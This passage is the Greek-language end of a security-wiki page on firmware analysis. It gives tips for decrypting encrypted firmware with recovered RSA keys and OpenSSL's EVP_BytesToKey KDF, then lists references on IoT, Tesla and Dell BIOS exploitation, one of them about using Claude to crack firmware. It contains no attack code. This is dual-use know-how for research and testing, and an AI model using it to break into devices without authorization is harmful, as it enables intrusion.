- Δοκιμάστε το ανακτημένο RSA key με το ακριβές ζεύγος padding/hash που χρησιμοποιεί το KMS. Μια αποτυχημένη αποκρυπτογράφηση PKCS#1 v1.5 και μια αποτυχημένη προεπιλεγμένη αποκρυπτογράφηση OAEP **δεν** αποδεικνύουν ότι το key είναι λάθος· πολλές ροές που βασίζονται στο Vault χρησιμοποιούν OAEP με SHA-256, ενώ οι κοινές βιβλιοθήκες έχουν ως προεπιλογή το SHA-1.
- Αν το payload αρχίζει με `Salted__`, αναπαράγετε ακριβώς το OpenSSL KDF του προμηθευτή (`EVP_BytesToKey`, συχνά MD5 σε παλαιότερες συσκευές) πριν επιχειρήσετε αποκρυπτογράφηση AES-CBC.

Έτσι, το «κρυπτογραφημένο firmware» γίνεται ένα γενικότερο πρόβλημα: **ανακτήστε τα λειτουργικά keys της συσκευής και, στη συνέχεια, αναπαράγετε offline τις ακριβείς παραμέτρους unwrap + KDF**.

## Εκπαίδευση και Πιστοποιήσεις

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware με Claude: Δεξιότητες ανώτερου επιπέδου, αυτονομία αρχάριου επιπέδου](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Μεθοδολογία ελέγχου ασφάλειας firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Πρακτικό IoT Hacking: Ο οριστικός οδηγός για την επίθεση στο Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Εκμετάλλευση zero days σε εγκαταλελειμμένο hardware – blog της Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Πώς μια έξυπνη συσκευή των $20 μου έδωσε πρόσβαση στο σπίτι σας](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Τώρα βλέπεις το mi: τώρα έχεις γίνει Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Εκμετάλλευση του Tesla Wall Connector από τη θύρα φόρτισης - Μέρος 2: παράκαμψη της προστασίας anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Κάντε το να αναβοσβήνει: Εκμετάλλευση μέσω Over-the-Air του Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS σε QEMU Μέρος 1: Αποσυσκευασία](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Τεκμηρίωση πυρήνα Linux - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS σε QEMU Μέρος 2: Αποσφαλμάτωση και διόρθωση](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Κωδικοί BIOS της Dell: Η αδύναμη κρυπτογράφηση XOR επιτρέπει την ανάκτηση από SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Εργαλεία ανάκτησης κωδικών BIOS της Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
